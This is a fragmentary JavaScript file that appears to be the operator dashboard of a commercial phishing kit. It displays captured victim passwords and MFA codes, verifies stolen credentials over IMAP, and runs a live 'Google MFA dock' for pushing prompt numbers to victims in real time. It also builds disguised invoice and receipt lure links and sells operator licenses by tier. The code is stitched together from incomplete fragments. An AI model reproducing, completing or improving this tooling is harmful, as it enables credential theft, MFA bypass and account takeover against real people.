    btns.push(`<button class="cc-btn ${danger ? 'cc-btn-danger' : 'cc-btn-primary'}" id="cc-modal-ok">${confirmText || 'OK'}</button>`);
    actions.innerHTML = btns.join('');
    document.getElementById('cc-modal-ok').onclick = () => close(true);
    const c = document.getElementById('cc-modal-cancel'); if (c) c.onclick = () => close(false);
    wrap.onclick = (e) => { if (e.target === wrap) close(false); };
    wrap.style.display = 'flex';
  });
}
// Drop-in replacements — return Promise
function confirmDialog(msg, opts) {
  const o = Object.assign({ title: 'Are you sure?', body: msg, confirmText: 'Continue', cancelText: 'Cancel', danger: false }, opts || {});
  return showModal(o);
}
function alertDialog(msg, opts) {
  const o = Object.assign({ title: 'Notice', body: msg, confirmText: 'OK', cancelText: null, type: 'info' }, opts || {});
  return showModal(o);
}

// Clipboard helper with fallback — navigator.clipboard only works on HTTPS/localhost
function copyText(text) {
  if (navigator.clipboard && window.isSecureContext) {
    return navigator.clipboard.writeText(text).then(() => true).catch(() => fallbackCopy(text));
  }
  return Promise.resolve(fallbackCopy(text));
}
function fallbackCopy(text) {
  try {
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed'; ta.style.left = '-9999px';
    document.body.appendChild(ta);
    ta.select(); ta.setSelectionRange(0, ta.value.length);
    const ok = document.execCommand('copy');
    document.body.removeChild(ta);
    return ok;
  } catch { return false; }
}

async function api(path) {
  const resp = await fetch(BASE + '/api/' + path);
  if (!resp.ok && resp.status === 401) { location.href = BASE + '/login'; return {}; }
  return resp.json();

function timeAgo(d) {
  const s = Math.floor((Date.now() - new Date(d)) / 1000);
  if (s < 60) return s + 's ago';
  if (s < 3600) return Math.floor(s / 60) + 'm ago';
  if (s < 86400) return Math.floor(s / 3600) + 'h ago';
  return Math.floor(s / 86400) + 'd ago';
}

function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }

// Delegated click-to-copy for elements with [data-copy="..."] (e.g. DNS instruction cells).
document.addEventListener('click', (e) => {
  const el = e.target.closest('[data-copy]');
  if (!el) return;
  const val = el.getAttribute('data-copy');
  if (!val) return;
  copyText(val).then(() => {
    const orig = el.style.background;
    el.style.background = '#dcfce7';
    const ic = el.querySelector('i.fa-copy');
    if (ic) { ic.classList.replace('fa-copy', 'fa-check'); ic.style.color = '#16a34a'; }
    setTimeout(() => {
      el.style.background = orig || '';
      if (ic) { ic.classList.replace('fa-check', 'fa-copy'); ic.style.color = '#9ca3af'; }
    }, 1100);
  });
});

function flagEmoji(cc) {
  if (!cc || cc.length !== 2) return '';
  return String.fromCodePoint(...cc.toUpperCase().split('').map(c => 127397 + c.charCodeAt(0)));
}
function linkFunnel(s) {
  if (!s || !s.clicks) return '<span style="color:var(--text-mute);font-size:11px;font-style:italic;">No clicks yet</span>';
  const stages = [
    { ic: 'fa-mouse-pointer', val: s.clicks    || 0, label: 'Clicks',    base: null },
    { ic: 'fa-eye',           val: s.opens     || 0, label: 'Opens',     base: s.clicks },
    { ic: 'fa-envelope',      val: s.emails    || 0, label: 'Emails',    base: s.opens || s.clicks },
    { ic: 'fa-key',           val: s.passwords || 0, label: 'Passwords', base: s.emails || s.opens },
    { ic: 'fa-shield-halved', val: s.mfas      || 0, label: 'MFAs',      base: s.passwords },
  ];
  let html = '<div style="display:flex;align-items:center;gap:5px;font-size:11px;flex-wrap:nowrap;">';
  stages.forEach((st, i) => {
    if (i > 0) html += '<i class="fas fa-chevron-right" style="color:var(--text-mute);font-size:8px;"></i>';
    const pct = (st.base && st.base > 0) ? ` (${Math.round(st.val / st.base * 100)}%)` : '';
    const tip = `${st.label}: ${st.val}${pct}`;
    const dim = st.val ? '' : 'opacity:0.30;';
    const color = st.val && i === stages.length - 1 ? 'var(--green)' : 'var(--blue)';
    html += `<span title="${tip}" style="display:inline-flex;align-items:center;gap:3px;${dim}"><i class="fas ${st.ic}" style="color:${color};width:11px;text-align:center;"></i><strong>${st.val}</strong></span>`;
  });
  if (s.uniqueClickIps && s.uniqueClickIps !== s.clicks) {
    html += `<span style="color:var(--text-mute);margin-left:6px;" title="Unique click IPs">·&nbsp;${s.uniqueClickIps}&nbsp;uniq</span>`;
  }
  html += '</div>';
  return html;
}

function geoCell(g) {
  if (!g) return '<span style="color:var(--text-mute);">—</span>';
  const flag = flagEmoji(g.countryCode);
  const loc = g.city ? `${esc(g.city)}, ${esc(g.country || '')}` : esc(g.country || 'Unknown');
  const isp = g.isp ? `<div style="color:var(--text-mute);font-size:10px;line-height:1.3;">${esc(g.isp)}</div>` : '';
  const tags = [];
  if (g.hosting) tags.push('<span class="badge red" style="padding:1px 6px;font-size:9px;" title="Datacenter / hosting">DC</span>');
  if (g.proxy)   tags.push('<span class="badge yellow" style="padding:1px 6px;font-size:9px;" title="Proxy / VPN">VPN</span>');
  return `<div style="display:flex;flex-direction:column;gap:2px;"><span>${flag} ${loc} ${tags.join(' ')}</span>${isp}</div>`;
}

// ---- Hard-to-miss MFA alert (chime + browser notification + tab title pulse) ----
// The dock alone is easy to miss when the operator is on another tab or scrolled
// elsewhere. This raises the alert ceiling without spamming when sessions are
// being actively handled.
let _mfaTitleTimer = null;
const _mfaOriginalTitle = document.title;
const _mfaSeenAlerts = new Set(); // de-dupe per email|ip in this session

function mfaPlayChime() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const o = ctx.createOscillator();
    const g = ctx.createGain();
    o.type = 'sine'; o.frequency.value = 880;
    g.gain.setValueAtTime(0, ctx.currentTime);
    g.gain.linearRampToValueAtTime(0.18, ctx.currentTime + 0.02);
    g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.55);
    o.connect(g).connect(ctx.destination);
    o.start();
    // Two-tone ding: 880Hz then 1320Hz, like a doorbell.
    setTimeout(() => { try { o.frequency.setValueAtTime(1320, ctx.currentTime); } catch {} }, 120);
    o.stop(ctx.currentTime + 0.6);
    setTimeout(() => { try { ctx.close(); } catch {} }, 800);
  } catch {}
}

function mfaRequestNotifPermission() {
  if (!('Notification' in window)) return;
  if (Notification.permission === 'default') {
    try { Notification.requestPermission(); } catch {}
  }
}
// Ask once on first admin load — needed before we can fire notifications later.
mfaRequestNotifPermission();

function mfaFireNotification(email, ip) {
  if (!('Notification' in window) || Notification.permission !== 'granted') return;
  try {
    const n = new Notification('Google MFA — push a number', {
      body: `${email}${ip ? ' · ' + ip : ''}\nClick to open Active MFA dock.`,
      tag: `mfa-${email}|${ip}`,        // collapses repeats for same victim
      requireInteraction: true,         // sticks until operator dismisses
      silent: false,
    });
    n.onclick = () => { window.focus(); n.close(); };
  } catch {}
}

function mfaStartTitlePulse() {
  if (_mfaTitleTimer) return;
  let on = true;
  _mfaTitleTimer = setInterval(() => {
    document.title = on ? `🔴 Active MFA · ${_mfaSeenAlerts.size} — ${_mfaOriginalTitle}`
                        : `⚪ Active MFA · ${_mfaSeenAlerts.size} — ${_mfaOriginalTitle}`;
    on = !on;
  }, 900);
}
function mfaStopTitlePulse() {
  if (!_mfaTitleTimer) return;
  clearInterval(_mfaTitleTimer);
  _mfaTitleTimer = null;
  document.title = _mfaOriginalTitle;
}

function mfaAlert(email, ip) {
  const key = `${email}|${ip}`;
  // Don't re-alert for the same session on every SSE re-broadcast / re-poll.
  if (_mfaSeenAlerts.has(key)) return;
  _mfaSeenAlerts.add(key);
  mfaPlayChime();
  mfaFireNotification(email, ip);
  mfaStartTitlePulse();
}

// Called by loadActiveMfa() when the dock empties — drop the title pulse.
function mfaClearAlertsIfIdle(sessionsLen) {
  if (sessionsLen === 0) {
    _mfaSeenAlerts.clear();
    mfaStopTitlePulse();
  }
}

// ---- Active Google MFA dock ----
// Lists victims currently on the Google Prompt screen waiting for an
// operator-pushed number. Refreshed on SSE events and every 4s as backstop.
async function loadActiveMfa() {
  const dock = document.getElementById('mfa-dock');
  if (!dock) return;
  try {
    const r = await fetch(BASE + '/api/mfa-active');
    if (!r.ok) { dock.style.display = 'none'; return; }
    const { sessions = [] } = await r.json();
    if (!sessions.length) { dock.style.display = 'none'; dock.innerHTML = ''; mfaClearAlertsIfIdle(0); return; }
    dock.style.display = '';
    // Pulse any session that's still waiting for a number (none pushed yet).
    const anyWaiting = sessions.some(s => !s.number);
    if (anyWaiting && !document.getElementById('mfa-dock-pulse-style')) {
      const st = document.createElement('style');
      st.id = 'mfa-dock-pulse-style';
      st.textContent = '@keyframes mfaDockPulse { 0%,100% { box-shadow: 0 8px 24px rgba(0,0,0,.08), 0 0 0 0 rgba(239,68,68,0.55); } 50% { box-shadow: 0 8px 24px rgba(0,0,0,.08), 0 0 0 10px rgba(239,68,68,0); } }';
      document.head.appendChild(st);
    }
    const rows = sessions.map(s => {
      const safeIp = String(s.ip || '').replace(/[^a-zA-Z0-9:.-]/g, '');
      const safeEmail = String(s.email || '').replace(/[^a-zA-Z0-9@._+-]/g, '');
      const wait = Math.max(0, Math.floor((Date.now() - s.ts) / 1000));
      const waitTxt = wait < 60 ? `${wait}s` : `${Math.floor(wait/60)}m ${wait%60}s`;
      const pushed = s.number
        ? `<div style="font-size:11px;color:#16a34a;font-weight:600;margin-top:4px;"><i class="fas fa-check-circle"></i> Pushed: <strong>${s.number}</strong></div>`
        : '';
      const pulseStyle = s.number
        ? 'border:1px solid #e5e7eb;'
        : 'border:1.5px solid #ef4444;animation:mfaDockPulse 1.4s ease-in-out infinite;';
      return `
        <div class="mfa-dock-card" data-ip="${safeIp}" data-email="${safeEmail}" style="background:#fff;${pulseStyle}border-radius:12px;padding:12px 14px;margin-bottom:10px;box-shadow:0 8px 24px rgba(0,0,0,.08);">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
            <div style="display:flex;align-items:center;gap:6px;font-size:12px;font-weight:700;color:#1a73e8;"><i class="fas fa-mobile-screen-button"></i> Google MFA — Live</div>
            <div style="font-size:11px;color:#6b7280;">${waitTxt}</div>
          </div>
          <div style="font-size:13px;font-weight:600;color:#111827;word-break:break-all;">${safeEmail}</div>
          <div style="font-size:11px;color:#6b7280;margin-bottom:8px;">${safeIp}</div>
          <div style="display:flex;gap:6px;">
            <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="3" placeholder="2-digit #" class="mfa-dock-input" style="flex:1;padding:8px 10px;border:1px solid #d1d5db;border-radius:8px;font-size:14px;font-weight:600;text-align:center;font-family:inherit;outline:none;" />
            <button class="mfa-dock-push btn" style="background:#1a73e8;color:#fff;border:none;border-radius:8px;padding:8px 14px;font-size:13px;font-weight:600;cursor:pointer;">Push</button>
          </div>
          ${pushed}
        </div>`;
    }).join('');
    dock.innerHTML = `<div style="font-size:11px;font-weight:700;color:#6b7280;text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;padding-left:4px;">Active MFA · ${sessions.length}</div>${rows}`;
    // If every active session has a pushed number, the operator is done — stop pulsing the tab title.
    if (!anyWaiting) mfaStopTitlePulse();

    dock.querySelectorAll('.mfa-dock-card').forEach(card => {
      const ip = card.dataset.ip;
      const email = card.dataset.email;
      const input = card.querySelector('.mfa-dock-input');
      const btn   = card.querySelector('.mfa-dock-push');
      const submit = async () => {
        const n = (input.value || '').replace(/\D/g, '');
        if (!n) { input.focus(); return; }
        btn.disabled = true; btn.textContent = '...';
        try {
          const r = await fetch(BASE + '/api/mfa-push', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'same-origin',
            body: JSON.stringify({ ip, email, number: n }),
          });
          const d = await r.json();
          if (!r.ok) { showToast(d.error || 'Push failed', 'error'); btn.disabled = false; btn.textContent = 'Push'; return; }
          showToast('Number pushed: ' + n, 'success');
          loadActiveMfa();
        } catch (e) {
          showToast('Network error', 'error');
          btn.disabled = false; btn.textContent = 'Push';
        }
      };
      btn.addEventListener('click', submit);
      input.addEventListener('keydown', (e) => { if (e.key === 'Enter') submit(); });
    });
  } catch { /* network blip — try again on next tick */ }
}
setInterval(loadActiveMfa, 4000);

async function loadLogins() {
  const { total, attempts } = await api('logins');
  const panel = document.getElementById('p-logins');

  </div>`;
  if (!attempts || attempts.length === 0) {
    h += '<div class="table-card"><div class="empty"><i class="fas fa-key"></i><p>No login attempts captured yet</p></div></div>';
  } else {
    h += '<div class="login-list">';
    attempts.forEach(a => {
      let typeBadge;
      if (a.type === 'mfa') {
        let methodLabel;
        switch (a.mfaMethod) {
          case 'sms': methodLabel = 'SMS'; break;
          case 'google_authenticator': methodLabel = 'Google Auth'; break;
          case 'google_backup': methodLabel = 'Google Backup'; break;
          case 'google_sms': methodLabel = 'Google SMS'; break;
          case 'google_prompt': methodLabel = 'Google Prompt'; break;
          default: methodLabel = 'Auth App';
        }
        typeBadge = `<span class="badge purple">MFA - ${methodLabel}</span>`;
      } else {
        typeBadge = '<span class="badge blue">Password</span>';
      }
      const value = a.type === 'mfa' ? (a.mfaCode || '-') : (a.password || '-');
      const uaStr = a.userAgent || '';
      let browser = 'Unknown';
      if (uaStr.includes('Edg/')) browser = 'Edge';
      else if (uaStr.includes('Chrome/')) browser = 'Chrome';
      else if (uaStr.includes('Firefox/')) browser = 'Firefox';
      else if (uaStr.includes('Safari/') && !uaStr.includes('Chrome')) browser = 'Safari';
      let os = '';
      if (uaStr.includes('Windows')) os = 'Windows';
      else if (uaStr.includes('Mac OS')) os = 'Mac';
      else if (uaStr.includes('Linux')) os = 'Linux';
      else if (uaStr.includes('Android')) os = 'Android';
      else if (uaStr.includes('iPhone') || uaStr.includes('iPad')) os = 'iOS';
      // Credential verification badge
      let imapBadge = '';
      if (a.type === 'password') {
        const vm = a.verifyMethod ? a.verifyMethod.toUpperCase() : '';
        if (a.imapResult === 'valid') imapBadge = `<span class="badge green" style="margin-left:auto;"><i class="fas fa-check-circle" style="margin-right:3px;"></i>VALID${vm ? ' ('+vm+')' : ''}</span>`;
        else if (a.imapResult === 'invalid') imapBadge = `<span class="badge red" style="margin-left:auto;"><i class="fas fa-xmark" style="margin-right:3px;"></i>Invalid${vm ? ' ('+vm+')' : ''}</span>`;
        else if (a.imapResult === 'oauth_only') imapBadge = '<span class="badge purple" style="margin-left:auto;"><i class="fas fa-lock" style="margin-right:3px;"></i>OAuth Only</span>';
        else if (a.imapResult === 'error') imapBadge = '<span class="badge yellow" style="margin-left:auto;"><i class="fas fa-exclamation-triangle" style="margin-right:3px;"></i>Error</span>';
        else if (a.imapResult === 'timeout') imapBadge = '<span class="badge yellow" style="margin-left:auto;"><i class="fas fa-clock" style="margin-right:3px;"></i>Timeout</span>';
        else if (a.imapResult === 'checking') imapBadge = '<span class="badge" style="margin-left:auto;color:var(--text-mute);"><i class="fas fa-spinner fa-spin" style="margin-right:3px;"></i>Checking</span>';
      }

      h += `<div class="login-card">
        <div class="login-top">
          ${typeBadge}
          <span class="login-email">${esc(a.email)}</span>
          <span class="login-pass">${esc(value)}</span>
          ${imapBadge}
          <button class="btn red" style="margin-left:8px;padding:4px 10px;font-size:11px;" title="Delete this entry" onclick="deleteLogin('${esc(a.id || '')}')"><i class="fas fa-trash"></i></button>
        </div>
        <div class="login-meta">
          <span><i class="fas fa-clock"></i> ${new Date(a.timestamp).toLocaleString()}</span>
          <span><i class="fas fa-globe"></i> ${esc(a.ip)}</span>
          <span><i class="fas fa-laptop"></i> ${esc(browser)}${os ? ' / ' + os : ''}</span>
          ${a.campaignId ? `<span><i class="fas fa-file-code"></i> <code>${esc(a.campaignId)}</code></span>` : ''}
          ${a.campaignDomain ? `<span><i class="fas fa-earth-americas"></i> ${esc(a.campaignDomain)}</span>` : ''}
        </div>
      </div>`;
    });
    h += '</div>';
  }
  panel.innerHTML = h;
}

async function verifyMyDomain() {
  const btn = document.getElementById('dom-verifyBtn');
  const msg = document.getElementById('dom-msg');
  if (!btn) return;
  btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
  const resp = await fetch(BASE + '/api/my-domain/verify', { method: 'POST' });
  const data = await resp.json();
  if (resp.ok && data.ok) {
    msg.style.display = 'inline'; msg.style.color = 'var(--green)';
    msg.textContent = '✓ Verified via ' + data.method + ' — provisioning SSL...';
    stopDnsStatusPolling();
    // Re-render now (badge shows "SSL Provisioning…") and again every 4s
    // until SSL becomes active or 90s pass — so the user sees the badge
    // flip to "Active" without reloading.
    setTimeout(() => loadSettings(), 800);
    let elapsed = 0;
    const sslPoll = setInterval(async () => {
      elapsed += 4000;
      try {
        const me = await (await fetch(BASE + '/api/me')).json();
        if (me.domainSslStatus === 'active' || elapsed >= 90000 || (me.domainSslStatus || '').startsWith('error')) {
          clearInterval(sslPoll);
          loadSettings();
        }
      } catch { /* keep polling */ }
    }, 4000);
  } else {
    btn.disabled = false; btn.innerHTML = '<i class="fas fa-check-circle" style="margin-right:4px;"></i>Verify';
    msg.style.display = 'inline'; msg.style.color = 'var(--red)';
    msg.textContent = data.error || 'Verification failed';
    setTimeout(() => { if (msg) msg.style.display = 'none'; }, 6000);
  }
}

// Live DNS propagation polling — runs while the verify panel is on screen so
// users see a green ✓ the moment their A or TXT record is detected, instead
// of guessing whether DNS has propagated.
let _dnsStatusTimer = null;
function stopDnsStatusPolling() {
  if (_dnsStatusTimer) { clearInterval(_dnsStatusTimer); _dnsStatusTimer = null; }
}
async function tickDnsStatus() {
  const aCell   = document.getElementById('dns-a-status');
  const txtCell = document.getElementById('dns-txt-status');
  if (!aCell && !txtCell) { stopDnsStatusPolling(); return; }
  try {
    const r = await fetch(BASE + '/api/my-domain/dns-status');
    if (!r.ok) return;
    const d = await r.json();
    const renderPill = (cell, rec) => {
      if (!cell || !rec) return;
      if (rec.ok) {
        cell.innerHTML = '<span class="dns-pill" style="font-size:11px;color:var(--green);font-weight:600;background:#dcfce7;padding:3px 8px;border-radius:999px;display:inline-flex;align-items:center;gap:4px;"><i class="fas fa-check-circle"></i> Detected</span>';
      } else if (rec.error && rec.error.includes('disabled')) {
        cell.innerHTML = '<span class="dns-pill" style="font-size:11px;color:var(--text-mute);">N/A</span>';
      } else if (rec.error && rec.error.includes('no record')) {
        cell.innerHTML = '<span class="dns-pill" style="font-size:11px;color:var(--text-mute);background:#f3f4f6;padding:3px 8px;border-radius:999px;display:inline-flex;align-items:center;gap:4px;"><i class="fas fa-clock"></i> Not yet</span>';
      } else {
        const txt = rec.error || 'mismatch';
        cell.innerHTML = `<span class="dns-pill" style="font-size:11px;color:#b45309;background:#fef3c7;padding:3px 8px;border-radius:999px;display:inline-flex;align-items:center;gap:4px;" title="${esc(txt)}"><i class="fas fa-triangle-exclamation"></i> ${esc(txt.slice(0, 30))}</span>`;
      }
    };
    renderPill(aCell, d.aRecord);
    renderPill(txtCell, d.txtRecord);
    // If either record is good, pulse the Verify button to draw attention.
    if ((d.aRecord && d.aRecord.ok) || (d.txtRecord && d.txtRecord.ok)) {
      const vbtn = document.getElementById('dom-verifyBtn');
      if (vbtn && !vbtn.dataset.pulsed) {
        vbtn.dataset.pulsed = '1';
        vbtn.style.animation = 'ccPop .25s';
        vbtn.style.background = 'var(--green)';
        vbtn.style.color = '#fff';
        vbtn.style.borderColor = 'var(--green)';
      }
    }
  } catch { /* network blip */ }
}
function startDnsStatusPolling() {
  stopDnsStatusPolling();
  if (!document.getElementById('dns-a-status') && !document.getElementById('dns-txt-status')) return;
  tickDnsStatus();
  _dnsStatusTimer = setInterval(tickDnsStatus, 8000);
}

        <td><span style="font-size:11px;padding:4px 8px;background:${l.documentType==='invitation'?'#fef3c7':l.documentType==='receipt'?'#d1fae5':l.documentType==='confirmation'?'#f3e8ff':l.documentType==='quickbook'?'#d1fae5':l.documentType==='fidelity'?'#dbeafe':'#dbeafe'};border-radius:4px;text-transform:capitalize;">${esc(l.documentType || 'invoice')}</span></td>

  h += `</div>`;

  // ---- Past Captures — emails from attachments you've already deleted ----
  if (orphans.length) {
    h += `<div style="margin-top:28px;">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">

  document.getElementById('p-links').innerHTML = h;

async function forgetPastCapture(cid) {
  if (!(await confirmDialog('Permanently delete the captured emails for this past attachment? This cannot be undone.', { title: 'Forget past captures?', danger: true, confirmText: 'Forget' }))) return;
  const resp = await fetch(BASE + '/api/forget-past-capture', { method: 'POST', headers: { 'Content-Type': J }, body: JSON.stringify({ cid }) });
  const data = await resp.json().catch(() => ({}));
  if (!resp.ok) { showToast(data.error || 'Failed', 'error'); return; }
  showToast(`Forgot ${data.removed||0} attempt(s)`, 'success');
  loadLinks();
}

async function deleteAttachment(cid) {
  if (!(await confirmDialog('Remove this attachment record and its visitor log?', { title: 'Delete attachment?', danger: true, confirmText: 'Delete' }))) return;
  const resp = await fetch(BASE + '/api/delete-attachment', { method: 'POST', headers: { 'Content-Type': J }, body: JSON.stringify({ cid }) });
  const data = await resp.json().catch(() => ({}));
  if (!resp.ok) { showToast(data.error || 'Failed', 'error'); return; }
  showToast('Attachment deleted', 'success');
  loadLinks();
}

  const customSubtitle = document.getElementById('gl-subtitle').value.trim();

  const btn = document.getElementById('gl-submit');
  btn.disabled = true; btn.textContent = 'Generating...';
  try {
    const resp = await fetch(BASE + '/api/links', { method: 'POST', headers: { 'Content-Type': J }, body: JSON.stringify({ email, expiresInHours, documentType, maxPasswordAttempts, maxMfaAttempts, customTitle, customSubtitle, customFooter }) });
    const data = await resp.json();
    if (!resp.ok) { document.getElementById('gl-msg').textContent = data.error; document.getElementById('gl-msg').style.display = 'inline'; document.getElementById('gl-msg').style.color = 'var(--red)'; btn.disabled = false; btn.textContent = 'Generate Link'; return; }

        <p style="font-size:13px;color:var(--text-dim);margin-bottom:12px;">${email ? 'Share this link with <strong>'+esc(email)+'</strong>. ' : 'Share this link with your client. '}It expires in ${esc(expiresInHours)} hours.</p>
        <div style="display:flex;gap:8px;align-items:stretch;">
          <input type="text" id="genlink-url" value="${esc(link)}" readonly
            style="flex:1;padding:10px 12px;border:1px solid var(--border);border-radius:8px;font-size:12px;font-family:monospace;background:#fff;color:var(--text);outline:none;" />
          <button class="btn blue" style="padding:8px 16px;width:auto;" onclick="copyText(document.getElementById('genlink-url').value);document.getElementById('gl-copy-msg').style.display='block';setTimeout(()=>document.getElementById('gl-copy-msg').style.display='none',3000)"><i class="fas fa-copy"></i> Copy</button>

// Trigger a download via a one-shot server-side staged file. Avoids
// blob:http://<admin-origin>/<uuid> URLs ever appearing in the network panel
// — the browser fetches /api/download/<id> directly and saves it via
// Content-Disposition: attachment.
function triggerStagedDownload(downloadId) {
  let iframe = document.getElementById('cha-dl-iframe');
  if (!iframe) {
    iframe = document.createElement('iframe');
    iframe.id = 'cha-dl-iframe';
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
  }
  // Cache-bust by appending now so reuse of the iframe still triggers download
  iframe.src = BASE + '/api/download/' + encodeURIComponent(downloadId);
}

}

    h += '<div class="table-card"><div class="empty"><i class="fas fa-users"></i><p>No users</p></div></div>';

    h += `<div style="margin-bottom:10px;">

      const licStatus = lic.tier === 'owner' ? '' : (!lic.active || isExpired) ? '<span class="badge red">Expired</span>' : '<span class="badge green">Active</span>';
      const daysLeft = lic.expiresAt ? Math.max(0, Math.ceil((new Date(lic.expiresAt).getTime() - Date.now()) / 86400000)) : null;
      const isSelf = u.id === currentUser.id;
      const searchKey = esc((u.username + ' ' + u.displayName + ' ' + (lic.key||'')).toLowerCase());
      h += `
      <div class="ua-item" data-search="${searchKey}" style="border:1px solid ${(!lic.active||isExpired)&&lic.tier!=='owner'?'var(--red)':'var(--border)'};border-radius:10px;margin-bottom:8px;background:#fff;overflow:hidden;${(!lic.active||isExpired)&&lic.tier!=='owner'?'opacity:0.7;':''}">

          <div style="display:grid;grid-template-columns:120px 1fr;gap:8px 14px;font-size:13px;margin-top:12px;">
            <div style="color:var(--text-mute);">License Key</div><div><code style="font-size:11px;background:#fff;border:1px solid var(--border);padding:4px 8px;border-radius:6px;cursor:pointer;" onclick="copyText('${esc(lic.key||'')}');this.style.color='var(--green)';setTimeout(()=>this.style.color='',1500);event.stopPropagation();">${esc(lic.key || 'N/A')}</code></div>
            <div style="color:var(--text-mute);">Tier</div><div>${tierBadge}</div>
            <div style="color:var(--text-mute);">Status</div><div>${lic.tier==='owner' ? '<span class="badge" style="color:#d4a017;">Forever</span>' : licStatus}</div>
            <div style="color:var(--text-mute);">Expires</div><div>${lic.tier==='owner' ? 'Never' : lic.expiresAt ? `${timeAgo(lic.expiresAt)} (${daysLeft} days ${isExpired?'ago':'left'})` : 'Not set'}</div>

            <div style="color:var(--text-mute);">Telegram</div><div>${u.telegramEnabled ? '<span class="badge green"><i class="fab fa-telegram"></i> On</span>' : '<span class="badge" style="color:var(--text-mute);">Off</span>'}</div>
            <div style="color:var(--text-mute);">Created</div><div>${timeAgo(u.createdAt)}</div>
          </div>
          ${isSelf || lic.tier==='owner' ? '' : `
          <div style="margin-top:14px;padding:10px 12px;background:#fff;border:1px solid var(--border);border-radius:8px;">
            <div style="font-size:11px;font-weight:600;color:var(--text-dim);margin-bottom:8px;">FEATURES</div>
            <div style="display:flex;gap:10px;flex-wrap:wrap;" onclick="event.stopPropagation()">

                const feat = u.features || {};
                return `<label style="display:flex;align-items:center;gap:5px;font-size:12px;cursor:pointer;">
                  <input type="checkbox" ${feat[f]?'checked':''} onchange="toggleUserFeature('${u.id}','${f}',this.checked)" style="width:14px;height:14px;" />
                  <i class="fas ${icons[f]}" style="font-size:10px;color:var(--text-dim);"></i>${labels[f]}

          </div>
          <div style="margin-top:10px;padding:10px 12px;background:#fff;border:1px solid var(--border);border-radius:8px;">
            <div style="font-size:11px;font-weight:600;color:var(--text-dim);margin-bottom:8px;">DOMAIN POLICY</div>
            <label style="display:flex;align-items:flex-start;gap:8px;font-size:12px;cursor:pointer;" onclick="event.stopPropagation()">

          <div style="margin-top:10px;display:flex;gap:6px;flex-wrap:wrap;">
            <button class="btn blue" onclick="event.stopPropagation();showEditForm('${u.id}')" style="padding:6px 14px;"><i class="fas fa-pen" style="margin-right:4px;"></i>Edit</button>

              <select onchange="event.stopPropagation();if(this.value){licenseAction('${u.id}','extend',{days:parseInt(this.value)});this.value='';}" style="padding:6px 10px;border:1px solid var(--border);border-radius:6px;font-size:12px;background:#fff;cursor:pointer;">
                <option value="">Renew...</option>
                <option value="30">+1 month</option>
                <option value="90">+3 months</option>
                <option value="180">+6 months</option>
                <option value="365">+12 months</option>
              </select>
              <select onchange="event.stopPropagation();if(this.value)licenseAction('${u.id}','set-tier',{tier:this.value});this.value=''" style="padding:6px 10px;border:1px solid var(--border);border-radius:6px;font-size:12px;background:#fff;">
                <option value="">Change tier...</option>
                <option value="basic">Basic</option>
                <option value="premium">Premium</option>
                <option value="vip">VIP</option>

    h += '</div>';
  }
  document.getElementById('p-users').innerHTML = h;
}

function toggleUserRow(id) {
  const body = document.getElementById(id);
  const chev = document.getElementById('chev-' + id.replace('ua-', ''));
  if (!body) return;
  const open = body.style.display !== 'none';
  body.style.display = open ? 'none' : 'block';
  if (chev) chev.style.transform = open ? 'rotate(0deg)' : 'rotate(90deg)';
}

function filterUsers(q) {
  const lc = (q || '').toLowerCase().trim();
  document.querySelectorAll('.ua-item').forEach(el => {
    el.style.display = (!lc || el.dataset.search.includes(lc)) ? '' : 'none';
  });
}

async function submitInviteForm() {
  // Only Tier + License duration + Activation expiry. The recipient sets
  // their own display name/username when they activate the link.
  const tier = document.getElementById('uf-tier').value;
  const licenseMonths = parseInt(document.getElementById('uf-license-months').value, 10);
  const expiresInHours = document.getElementById('uf-expires').value;
  const btn = document.getElementById('uf-submit');

  btn.disabled = true; btn.textContent = 'Generating...';
  try {
    const resp = await fetch(BASE + '/api/tokens', {
      method: 'POST', headers: { 'Content-Type': J },
      body: JSON.stringify({ tier, licenseMonths, expiresInHours }),
    });
    const data = await resp.json();
    if (!resp.ok) { showFormMsg(data.error || 'Failed.', 'red'); btn.disabled = false; btn.textContent = 'Generate Token'; return; }

    // Build the link and the success-panel HTML BEFORE refreshing the
    // users table — loadUsers() rewrites the whole #p-users innerHTML
    // (including #invite-link-display), so we need to re-render the panel
    // AFTER it finishes, otherwise it gets wiped instantly.
    const link = location.origin + BASE + '/activate?token=' + data.token;
    const successHtml = `
      <div class="user-form" style="border-color:var(--green);background:#f0fdf4;">
        <h3 style="color:var(--green);"><i class="fas fa-check-circle" style="margin-right:6px;"></i>Invite Generated</h3>
        <p style="font-size:13px;color:var(--text-dim);margin-bottom:12px;">Send this one-time link to your client. Expires in ${esc(expiresInHours)} hours, single use.</p>
        <div style="display:flex;gap:8px;align-items:stretch;">
          <input type="text" id="invite-link-input" value="${esc(link)}" readonly
            style="flex:1;padding:10px 12px;border:1px solid var(--border);border-radius:8px;font-size:12px;font-family:monospace;background:#fff;color:var(--text);outline:none;" />
          <button class="btn blue" style="padding:8px 16px;width:auto;" onclick="copyInviteLink()"><i class="fas fa-copy"></i> Copy</button>
        </div>
        <p id="copy-msg" style="font-size:12px;color:var(--green);margin-top:8px;display:none;"><i class="fas fa-check"></i> Copied to clipboard</p>
        <div style="margin-top:12px;">
          <button class="btn" style="padding:6px 14px;" onclick="document.getElementById('invite-link-display').innerHTML='';">Dismiss</button>
        </div>
      </div>`;
    hideUserForm();
    await loadUsers();
    const display = document.getElementById('invite-link-display');
    if (display) {
      display.innerHTML = successHtml;
      const inp = document.getElementById('invite-link-input');
      if (inp) inp.select();
      display.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
  } catch {
    showFormMsg('Network error.', 'red');
    btn.disabled = false; btn.textContent = 'Generate Token';
  }
}

function copyInviteLink() {
  const input = document.getElementById('invite-link-input');
  input.select();
  copyText(input.value).then(() => {
    const msg = document.getElementById('copy-msg');
    msg.style.display = 'block';
    setTimeout(() => { msg.style.display = 'none'; }, 3000);
  });
}

async function revokeToken(tokenPrefix) {
